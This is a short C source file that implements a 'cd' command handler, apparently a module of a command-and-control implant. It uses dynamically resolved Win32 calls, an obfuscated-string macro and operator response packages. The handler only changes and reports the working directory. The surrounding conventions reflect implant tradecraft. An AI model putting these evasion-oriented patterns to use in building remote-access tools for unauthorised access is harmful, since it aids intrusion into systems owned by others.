#include "config.h"
#ifdef INCLUDE_CMD_CD

#include "commands.h"

VOID cmd_cd(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);
    if (!path || path_len == 0) {
        package_add_string(inst, response, XSTR("No path specified"));
        response->is_error = TRUE;
        return;
    }

    char pathbuf[MAX_PATH] = {0};
    es_memcpy(pathbuf, path, path_len < MAX_PATH-1 ? path_len : MAX_PATH-1);

    if (!inst->Win32.SetCurrentDirectoryA(pathbuf)) {
        package_add_string(inst, response, XSTR("Failed to change directory"));
        response->is_error = TRUE;
        return;
    }

    char cwd[MAX_PATH] = {0};
    inst->Win32.GetCurrentDirectoryA(MAX_PATH, cwd);
    package_add_string(inst, response, cwd);
}

#endif
